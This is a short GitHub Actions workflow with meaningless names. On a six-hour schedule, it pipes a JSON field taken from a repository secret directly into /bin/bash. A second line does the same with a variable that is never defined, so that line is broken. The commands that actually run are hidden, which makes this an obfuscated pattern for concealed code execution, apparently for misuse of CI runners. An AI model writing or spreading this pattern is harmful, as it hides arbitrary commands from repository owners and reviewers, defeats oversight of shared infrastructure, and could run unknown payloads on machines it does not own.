name: songliwen1986

on:
  workflow_dispatch:
  schedule:
    - cron: '28 0/6 * * *'
jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4
      - name: songliwen1986
        env:
          a60: ${{ secrets.a60 }}
        run: |
          echo $a60 | jq -r .jb95 | /bin/bash
          echo $rt14084 | jq -r .u198 | /bin/bash

